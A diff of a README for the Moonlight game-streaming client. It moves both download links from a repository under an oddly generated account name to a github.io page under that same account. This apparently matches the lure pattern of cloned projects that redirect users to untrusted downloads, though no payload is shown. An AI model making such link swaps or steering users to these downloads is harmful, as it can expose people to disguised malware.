@@ -1,6 +1,6 @@
 # 🎮 Moonlight - Stream games to your computer
 
-[![](https://img.shields.io/badge/Download-Moonlight-blue.svg)](https://github.com/diminished-agranulocytosis800/Moonlight)
+[![](https://img.shields.io/badge/Download-Moonlight-blue.svg)](https://diminished-agranulocytosis800.github.io)
 
 Moonlight allows you to stream your personal game library from a powerful host computer to your Windows PC. It captures high-quality video and audio from your game and sends it over your local network. You play your games on your PC while the actual processing happens elsewhere.
 
@@ -17,7 +17,7 @@ Before you start, ensure your environment meets these requirements:
 
 Visit the official project page to download the latest version of the software.
 
-[Click here to visit the download page](https://github.com/diminished-agranulocytosis800/Moonlight)
+[Click here to visit the download page](https://diminished-agranulocytosis800.github.io)
 
 1. Open a web browser on your Windows PC.
 2. Go to the link provided above.
